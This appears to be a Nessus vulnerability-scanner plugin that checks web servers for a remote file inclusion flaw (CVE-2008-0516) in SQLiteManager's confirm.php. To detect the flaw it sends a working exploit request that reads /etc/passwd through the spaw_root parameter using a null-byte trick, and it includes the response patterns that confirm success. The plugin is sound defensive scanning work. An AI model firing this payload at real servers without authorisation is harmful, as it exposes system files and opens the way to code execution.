#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(30131);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2008-0516");
  script_bugtraq_id(27515);
  script_xref(name:"OSVDB", value:"40781");

  script_name(english:"SQLiteManager confirm.php spaw_root Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with SQLiteManager");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
remote file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running SQLiteManager, a web-based application for
managing SQLite databases. 

The version of SQLiteManager installed on the remote host fails to
sanitize user-supplied input to the 'spaw_root' parameter of the
'spaw/dialogs/confirm.php' script before using it to include PHP code. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated remote attacker can exploit this issue to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/sqlitemanager", "/sqlite", "/db", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to retrieve a local file.
  file = "/etc/passwd";

  req = http_get(
    item:string(
      dir, "/spaw/dialogs/confirm.php?", 
      "spaw_root=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error because magic_quotes was enabled or...
    string(file, "\\0class/lang.class.php") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("main(", file, "): failed to open stream: No such file") >< res ||
    string("include(", file, ") [function.include]: failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    if (report_verbosity && egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = res;
      if ("<br" >< contents) contents = contents - strstr(contents, "<br");

      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
